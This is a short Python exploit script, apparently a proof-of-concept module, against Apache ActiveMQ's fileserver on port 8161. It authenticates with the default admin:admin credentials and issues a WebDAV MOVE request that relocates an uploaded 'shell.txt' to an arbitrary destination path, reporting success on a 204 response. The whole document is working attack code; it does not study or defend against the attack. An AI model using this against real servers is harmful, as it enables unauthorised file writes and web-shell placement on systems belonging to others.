import base64
import requests

requests.packages.urllib3.disable_warnings()
def run(url):
    """任意文件"""
    user = "admin"
    pwd = "admin"
    headers = {
            'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode(),
            'Destination':'file:/tmp/test.txt',
        }
    req = requests.request('MOVE', url+':8161/fileserver/shell.txt', headers=headers, timeout=3)
    if req.status_code == 204:
        return 'ActiveMQ move file success'
    else:
        return False